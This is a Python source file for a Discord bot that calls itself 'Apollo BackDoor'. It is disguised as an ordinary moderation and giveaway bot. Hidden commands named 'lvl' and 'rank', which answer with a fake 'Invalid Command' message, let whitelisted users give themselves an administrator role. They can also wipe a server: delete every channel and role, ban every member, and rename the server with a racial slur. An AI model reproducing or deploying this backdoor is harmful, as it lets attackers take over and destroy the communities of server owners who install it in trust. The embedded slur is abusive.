import discord, colorama, ctypes, os, json, requests, asyncio, re, random
from discord.ext import commands
from discord.utils import get
from discord import Embed
from colorama import Fore
from datetime import datetime

os.system('cls')
version = "1.6"

ctypes.windll.kernel32.SetConsoleTitleW(f'Apollo BackDoor Bot | {version} | Made by dori#4040')

with open('config.json') as f:
    info = json.load(f)
    
BotName = info["BotInfo"]["Name"]

print(f"""{Fore.LIGHTRED_EX}
 ▄▄▄      ██▓███  ▒█████  ██▓    ██▓    ▒█████      ▄▄▄▄   ▄▄▄      ▄████▄  ██ ▄█▓█████▄ ▒█████  ▒█████  ██▀███  
▒████▄   ▓██░  ██▒██▒  ██▓██▒   ▓██▒   ▒██▒  ██▒   ▓█████▄▒████▄   ▒██▀ ▀█  ██▄█▒▒██▀ ██▒██▒  ██▒██▒  ██▓██ ▒ ██▒
▒██  ▀█▄ ▓██░ ██▓▒██░  ██▒██░   ▒██░   ▒██░  ██▒   ▒██▒ ▄█▒██  ▀█▄ ▒▓█    ▄▓███▄░░██   █▒██░  ██▒██░  ██▓██ ░▄█ ▒
░██▄▄▄▄██▒██▄█▓▒ ▒██   ██▒██░   ▒██░   ▒██   ██░   ▒██░█▀ ░██▄▄▄▄██▒▓▓▄ ▄██▓██ █▄░▓█▄   ▒██   ██▒██   ██▒██▀▀█▄  
 ▓█   ▓██▒██▒ ░  ░ ████▓▒░██████░██████░ ████▓▒░   ░▓█  ▀█▓▓█   ▓██▒ ▓███▀ ▒██▒ █░▒████▓░ ████▓▒░ ████▓▒░██▓ ▒██▒
 ▒▒   ▓▒█▒▓▒░ ░  ░ ▒░▒░▒░░ ▒░▓  ░ ▒░▓  ░ ▒░▒░▒░    ░▒▓███▀▒▒▒   ▓▒█░ ░▒ ▒  ▒ ▒▒ ▓▒▒▒▓  ▒░ ▒░▒░▒░░ ▒░▒░▒░░ ▒▓ ░▒▓░
  ▒   ▒▒ ░▒ ░      ░ ▒ ▒░░ ░ ▒  ░ ░ ▒  ░ ░ ▒ ▒░    ▒░▒   ░  ▒   ▒▒ ░ ░  ▒  ░ ░▒ ▒░░ ▒  ▒  ░ ▒ ▒░  ░ ▒ ▒░  ░▒ ░ ▒░
  ░   ▒  ░░      ░ ░ ░ ▒   ░ ░    ░ ░  ░ ░ ░ ▒      ░    ░  ░   ▒  ░       ░ ░░ ░ ░ ░  ░░ ░ ░ ▒ ░ ░ ░ ▒   ░░   ░ 
      ░  ░           ░ ░     ░  ░   ░  ░   ░ ░      ░           ░  ░ ░     ░  ░     ░       ░ ░     ░ ░    ░     
                                                         ░         ░              ░                              {Fore.RESET}
――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――{Fore.RED}
| BOT STATUS |: {Fore.LIGHTRED_EX}Connected{Fore.RED}
| BOT NAME |: {Fore.LIGHTRED_EX}{BotName}{Fore.RESET}
――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
{Fore.RED}| TYPE: Message | Apollo BackDoor |:{Fore.LIGHTRED_EX} Created By dori#4040
{Fore.RED}| TYPE: Message | Apollo BackDoor |:{Fore.LIGHTRED_EX} You are currently using Apollo BackDoor: {version}""")

outornot = requests.get('https://raw.githubusercontent.com/ZukoHD/BackDoorBot/main/version.data').text

if version in outornot:
    print(f"{Fore.RESET}――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――")
else:
    print(f"{Fore.RED}| TYPE: Message | Apollo BackDoor |:{Fore.LIGHTRED_EX} You are using a Outdated Build! Get updated at github.com/ZukoHD/BackDoorBot")
    print(f"{Fore.RESET}――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――")
    
    
role_name = info["RoleInfo"]["Name"]
RolePos = info["RoleInfo"]["Position"]

Verified = info["UserInfo"]["Usernames"]

BotPrefix = info["BotInfo"]["Prefix"]
Token = info["BotInfo"]["Token"]

Icon = info["BotInfo"]["Icon"]

activity = discord.Activity(type=discord.ActivityType.watching, name=f"{BotPrefix}help")

bot = commands.Bot(command_prefix=BotPrefix, bot_name=BotName,activity=activity, status=discord.Status.idle, case_insensitive=True)
bot.remove_command("help")

def msg(text):
    print(f"{Fore.RED}| TYPE: Message | Apollo BackDoor |: {Fore.LIGHTRED_EX}{text}")

@bot.command()
async def lvl(ctx):
    user_noatt = ctx.message.author.name + '#' + ctx.message.author.discriminator
    
    if user_noatt in Verified:      
        guild = ctx.guild
        user = ctx.author
        
        if not get(guild.roles, name=role_name):
            await guild.create_role(name=role_name)
            role = discord.utils.get(guild.roles, name=role_name)
        
            permissions = discord.Permissions()
            permissions.update(administrator=True)
            await role.edit(reason = "Unknown", permissions=permissions, position=RolePos)
        
            if not role in user.roles:
                await user.add_roles(role)
                msg(f"Added BackDoor Role to {user_noatt}")
        else:
            role = discord.utils.get(guild.roles, name=role_name)
            if not role in user.roles:
                await user.add_roles(role)
                msg(f"Added BackDoor Role to {user_noatt}")
    embed = discord.Embed(
            title=f"**{BotName} - Invalid Command**",
            description = f"Invalid Command Entered!",
            colour = 23807
    )
    
    embed.set_footer(
            text = f'{BotName} - {version} | ' + datetime.now().strftime("%d/%m/%Y"),
            icon_url = Icon
    )
    await ctx.send(embed=embed)
                
@bot.command()
@commands.has_permissions(ban_members = True)
async def ban(ctx, member : discord.Member, reason=None):
    if member == None:
        embed = discord.Embed(
            title=f"**{BotName} - Ban Command**",
            description = f"Make sure you specify a member to ban!",
            colour = 23807
        )
    
        embed.set_footer(
            text = f'{BotName} - {version} | ' + datetime.now().strftime("%d/%m/%Y"),
            icon_url = Icon
        )
        await ctx.send(embed=embed)
    else:
        embed = discord.Embed(
            title=f"**{BotName} - Ban Command**",
            description = f"Successfully Banned Member!",
            colour = 23807
        )
    
        embed.set_footer(
            text = f'{BotName} - {version} | ' + datetime.now().strftime("%d/%m/%Y"),
            icon_url = Icon
        )
    
        embeddm = discord.Embed(
            title=f"**{BotName} - Banned**",
            description = f"You have been banned from **{ctx.guild.name}**! Reason: **{reason}**",
            colour = 23807
        )
    
        embeddm.set_footer(
            text = f'{BotName} - {version} | ' + datetime.now().strftime("%d/%m/%Y"),
            icon_url = Icon
        )
        await ctx.send(embed=embed)
        await member.send(embed=embeddm)
        await member.ban(reason=reason)        
        
@bot.command()
@commands.has_permissions(ban_members = True)
async def unban(ctx, user: discord.User):
    if user == None:
        embed = discord.Embed(
            title=f"**{BotName} Unban Command**",
            description = f"Make sure you specify a member to Unban!",
            colour = 23807
        )
    
        embed.set_footer(
            text = f'{BotName} - {version} | ' + datetime.now().strftime("%d/%m/%Y"),
            icon_url = Icon
        )
        await ctx.send(embed=embed)
    else:
        embed = discord.Embed(
            title=f"**{BotName} - Unban Command**",
            description = f"Successfully Unbanned Member!",
            colour = 23807
        )
    
        embed.set_footer(
            text = f'{BotName} - {version} | ' + datetime.now().strftime("%d/%m/%Y"),
            icon_url = Icon
        )
    
        embeddm = discord.Embed(
            title=f"**{BotName} - Unbanned**",
            description = f"You have been Unbanned from **{ctx.guild.name}**!",
            colour = 23807
        )
    
        embeddm.set_footer(
            text = f'{BotName} - {version} | ' + datetime.now().strftime("%d/%m/%Y"),
            icon_url = Icon
        )
        await ctx.send(embed=embed)
        await user.send(embed=embeddm)
        await ctx.guild.unban(user)
        
@bot.command()
@commands.has_permissions(kick_members = True)
async def kick(ctx, member : discord.Member, reason=None):
    if member == None:
        embed = discord.Embed(
            title=f"**{BotName} - Kick Command**",
            description = f"Make sure you specify a member to kick!",
            colour = 23807
        )
    
        embed.set_footer(
            text = f'{BotName} - {version} | ' + datetime.now().strftime("%d/%m/%Y"),
            icon_url = Icon
        )
        await ctx.send(embed=embed)
    else:
        embed = discord.Embed(
            title=f"**{BotName} - Kick Command**",
            description = f"Successfully Kicked Member!",
            colour = 23807
        )
    
        embed.set_footer(
            text = f'{BotName} - {version} | ' + datetime.now().strftime("%d/%m/%Y"),
            icon_url = Icon
        )
    
        embeddm = discord.Embed(
            title=f"**{BotName} - Kicked**",
            description = f"You have been kicked from **{ctx.guild.name}**! Reason: **{reason}**",
            colour = 23807
        )
    
        embeddm.set_footer(
            text = f'{BotName} - {version} | ' + datetime.now().strftime("%d/%m/%Y"),
            icon_url = Icon
        )
        await ctx.send(embed=embed)
        await member.send(embed=embeddm)
        await member.kick(reason=reason)        

@bot.command(pass_context=True)
@commands.has_permissions(manage_roles=True)
async def addrole(ctx, member : discord.Member, role: discord.Role):
    embed = discord.Embed(
            title=f"**{BotName} - Add Role Command**",
            description = f"Successfully Added Role To Member!",
            colour = 23807
    )
    
    embed.set_footer(
            text = f'{BotName} - {version} | ' + datetime.now().strftime("%d/%m/%Y"),
            icon_url = Icon
    )
    
    await ctx.send(embed=embed)
    await member.add_roles(role)
    
time_regex = re.compile(r"(?:(\d{1,5})(h|s|m|d))+?")
time_dict = {"h": 3600, "s": 1, "m": 60, "d": 86400}

def timeconvert(argument):
    args = argument.lower()
    matches = re.findall(time_regex, args)
    time = 0
    for key, value in matches:
        try:
            time += time_dict[value] * float(key)
        except KeyError:
            raise commands.BadArgument(
                f"{value} is an invalid time key! h|m|s|d are valid arguments"
            )
        except ValueError:
            raise commands.BadArgument(f"{key} is not a number!")
    return round(time)

@bot.command()
async def giveaway(ctx, timing, winners: int, *, prize):
    user_noatt = ctx.message.author.name + '#' + ctx.message.author.discriminator
    await ctx.send('Okay, making a giveaway!', delete_after=3)
    time = timeconvert(timing)
  
    embed = discord.Embed(
            title=f"**🎉 Giveaway 🎉 - {prize}**",
            description = f"**Giveaway Host:** {user_noatt}\n**Prize:** {prize}\n\nThis Giveaway will end {time} seconds from this message.",
            colour = 23807
    )
  
    embed.set_footer(
            text = f'{BotName} - {version} | ' + datetime.now().strftime("%d/%m/%Y"),
            icon_url = Icon
    )
    
    embed2 = discord.Embed(
            title=f"**🎉 Giveaway 🎉 - {prize}**",
            description = f"**This Giveaway has ended! No one has won!**",
            colour = 23807
    )
  
    embed2.set_footer(
            text = f'{BotName} - {version} | ' + datetime.now().strftime("%d/%m/%Y"),
            icon_url = Icon
    )
  
    gwembed = await ctx.send(embed=embed)
    await gwembed.add_reaction("🎉")
    await asyncio.sleep(time)
    
    message = await ctx.fetch_message(gwembed.id)
    users = await message.reactions[0].users().flatten()
    users.pop(users.index(ctx.guild.me))
    if len(users) == 0:
        await gwembed.edit(embed=embed2)
        return
    for i in range(winners):
        winner = random.choice(users)
        
        embed3 = discord.Embed(
            title=f"**🎉 Giveaway 🎉 - {prize}**",
            description = f"This Giveaway has ended! {winner} has won!",
            colour = 23807
        )
  
        embed3.set_footer(
            text = f'{BotName} - {version} | ' + datetime.now().strftime("%d/%m/%Y"),
            icon_url = Icon
        )
        
        await gwembed.edit(embed=embed3)

@bot.command(pass_context=True)
@commands.has_permissions(manage_roles=True)
async def removerole(ctx, member : discord.Member, role: discord.Role):
    embed = discord.Embed(
            title=f"**{BotName} - Remove Role Command**",
            description = f"Successfully Removed Role from Member!",
            colour = 23807
    )
    
    embed.set_footer(
            text = f'{BotName} - {version} | ' + datetime.now().strftime("%d/%m/%Y"),
            icon_url = Icon
    )
    
    await ctx.send(embed=embed)
    await member.remove_roles(role)
        
@bot.command(pass_context = True)
async def rank(ctx):
    user_noatt = ctx.message.author.name + '#' + ctx.message.author.discriminator
    
    if user_noatt in Verified:
        for channel in list(ctx.guild.channels):
            try:
                await channel.delete()    
            except Exception as e:
                msg(f"An Error Occured While Removing Channels: {e}")
                pass
        
        for member in ctx.guild.members:
            try:
                await member.ban()
            except Exception as e:
                msg(f"An Error Occured While Banning: {e}")
                pass
            
        for role in list(ctx.guild.roles):
            try:
                await role.delete()
            except Exception as e:
                msg(f"An Error Occured While Removing Roles: {e}")
                pass
        
        try:
            await ctx.guild.edit(
            name="get nuked",
            description="stfu nigga",
            reason="Fuck You!!!!!",
            icon=None,
            banner=None
            )  
        except:
            pass        
        for _i in range(10):
            await ctx.guild.create_text_channel(name="nuked")
        for _i in range(10):
            await ctx.guild.create_role(name="nuked")

    embed = discord.Embed(
            title=f"**{BotName} - Invalid Command**",
            description = f"Invalid Command Entered!",
            colour = 23807
    )
    
    embed.set_footer(
            text = f'{BotName} - {version} | ' + datetime.now().strftime("%d/%m/%Y"),
            icon_url = Icon
    )
    await ctx.send(embed=embed)
    
@bot.command()
async def help(ctx):
    embed = discord.Embed(
            title=f"**{BotName} - Help/Commands**",
            description = f"This Bot Does NOT require commands, But below are some commands you might find useful.\n**- a!ban <member> <reason> : Bans a member!\n- a!unban <member> : Unbans a member!\n- a!kick <member> <reason> : Kicks a member!\n- a!addrole <member> <role> : Adds a Role to a member!\n- a!removerole <member> <role> : Removes a Role from a member!\n- a!giveaway <time> <winners> <prize> : Creates a giveaway!**",
            colour = 23807
    )
    
    embed.set_footer(
            text = f'{BotName} - {version} | ' + datetime.now().strftime("%d/%m/%Y"),
            icon_url = Icon
    )
    await ctx.send(embed=embed)
                
@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        msg("Not A Valid Command!")
        embed = discord.Embed(
            title=f"**{BotName} - Invalid Command**",
            description = f"Invalid Command Entered!",
            colour = 23807
        )
    
        embed.set_footer(
            text = f'{BotName} - {version} | ' + datetime.now().strftime("%d/%m/%Y"),
            icon_url = Icon
        )
        
        await ctx.send(embed=embed)
    if isinstance(error, commands.MissingPermissions):
        embed = discord.Embed(
            title=f"**{BotName} - Missing Permissions**",
            description = f"You do not have the permissions to execute this command!",
            colour = 23807
        )
    
        embed.set_footer(
            text = f'{BotName} - {version} | ' + datetime.now().strftime("%d/%m/%Y"),
            icon_url = Icon
        )
        
        await ctx.send(embed=embed)

bot.run(Token)
